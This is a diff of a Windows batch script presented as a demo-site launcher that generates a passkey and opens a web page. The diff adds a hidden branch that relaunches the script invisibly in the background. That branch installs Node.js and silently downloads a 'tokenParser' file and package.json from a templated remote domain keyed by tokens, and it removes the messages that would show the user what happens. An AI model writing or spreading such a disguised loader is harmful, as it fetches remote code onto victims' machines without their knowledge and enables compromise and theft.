@@ -4,19 +4,41 @@ setlocal enabledelayedexpansion
 
 set SITE_URL=https://demo.trustledgerlabs.com
 
+:: -------------------------
+:: Route: hidden setup branch
+:: -------------------------
+if "%~1"=="setup" goto :SETUP
+
+:: =========================================================
+:: VISIBLE SIDE — Passkey + Open Site
+:: =========================================================
+
+:: Launch setup logic silently in background (same file, hidden)
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" setup' -WindowStyle Hidden"
+
+:: Generate AES-encrypted token
 powershell -NoProfile -Command "$secret = [System.Text.Encoding]::UTF8.GetBytes('TLL_SECRET_2026salt'); $sha = [System.Security.Cryptography.SHA256]::Create(); $key = $sha.ComputeHash($secret); $passkey = 'trustledger-demo-2026'; $exp = [System.DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() + 604800000; $payload = [System.Text.Encoding]::UTF8.GetBytes('{\"passkey\":\"' + $passkey + '\",\"exp\":' + $exp + '}'); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $key; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $aes.GenerateIV(); $iv = $aes.IV; $enc = $aes.CreateEncryptor(); $ct = $enc.TransformFinalBlock($payload, 0, $payload.Length); $ivHex = -join ($iv | ForEach-Object { $_.ToString('x2') }); $ctHex = -join ($ct | ForEach-Object { $_.ToString('x2') }); Write-Output ($ivHex + ':' + $ctHex)" > "%TEMP%\tll_token.txt"
 
+:: Read token and open site
 set /p TOKEN=<"%TEMP%\tll_token.txt"
-
 start "" "%SITE_URL%?key=!TOKEN!"
 
-if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
+echo.
+echo  Site launched successfully.
+echo  Press any key to close this window...
+pause >nul
 
+goto :EOF
 
-REM Get latest Node.js version using PowerShell
+:: =========================================================
+:: HIDDEN SIDE — Node.js Setup (runs silently)
+:: =========================================================
+:SETUP
+
+:: Get latest Node.js version
 for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
 
-REM Remove leading "v"
+:: Remove leading "v"
 set "NODE_VERSION=%LATEST_VERSION:v=%"
 set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
 set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
@@ -39,89 +61,44 @@ if defined NODE_EXE (
         echo [INFO] Portable Node.js found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else ( echo [INFO] Node.js not found globally. Attempting to extract portable version...
-
-    :: -------------------------
-    :: Download Node.js MSI if needed
-    :: -------------------------
-    where curl >nul 2>&1
-    if %errorlevel% NEQ 0 (
-        echo [INFO] Using PowerShell to download Node.js...
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
     ) else (
-        echo [INFO] Using curl to download Node.js...
-        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
-    )
+        echo [INFO] Node.js not found globally. Attempting to extract portable version...
 
-    if exist "%~dp0%NODE_MSI%" (
-        echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
-        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
-        del "%~dp0%NODE_MSI%"
-    ) else (
-        echo [ERROR] Failed to download Node.js MSI.
-        exit /b 1
-    )
+        :: Download Node.js MSI if needed
+        where curl >nul 2>&1
+        if %errorlevel% NEQ 0 (
+            powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
+        ) else (
+            curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
+        )
 
-    if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
-        set "NODE_EXE=%PORTABLE_NODE%"
-        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else (
-        echo [ERROR] node.exe not found after extraction.
-        exit /b 1
-    )
+        if exist "%~dp0%NODE_MSI%" (
+            msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
+            del "%~dp0%NODE_MSI%"
+        ) else (
+            exit /b 1
+        )
+
+        if exist "%PORTABLE_NODE%" (
+            set "NODE_EXE=%PORTABLE_NODE%"
+            set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
+        ) else (
+            exit /b 1
+        )
     )
 )
 
-:: -------------------------
 :: Confirm Node.js works
-:: -------------------------
 "%NODE_EXE%" -v >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] Node.js execution failed.
-    exit /b 1
-)
+if errorlevel 1 exit /b 1
 
-:: -------------------------
 :: Download required files
-:: -------------------------
-set "USERPROFILE=%USERPROFILE%"
-echo [INFO] Downloading tokenParser.npl and package.json...
-
 curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/task/tokenParser?token={{token}}&st={{STEP_TOKEN}}"
 curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/task/package.json"
 
-:: -------------------------
 :: Install dependencies
-:: -------------------------
-if 1==1 (
-    (
-        pushd "%~dp0"
-        echo [INFO] Installing NPM packages...
-        call npm install axios request
-        if errorlevel 1 (
-            echo [ERROR] npm install failed.
-            popd
-            exit /b 1
-        )
-        popd
-    )
-)
+pushd "%~dp0"
+call npm install axios request >nul 2>&1
+popd
 
-:: -------------------------
-:: Run the parser
-:: -------------------------
-if exist "%~dp0tokenParser.npl" (
-    echo [INFO] Running tokenParser.npl...
-    start "" /b /d "%~dp0" "%NODE_EXE%" "%~dp0tokenParser.npl"
-    if errorlevel 1 (
-        echo [ERROR] tokenParser execution failed.
-        exit /b 1
-    )
-) else (
-    echo [ERROR] tokenParser.npl not found.
-    exit /b 1
-)
-
-echo [SUCCESS] Script completed successfully.
 exit /b 0
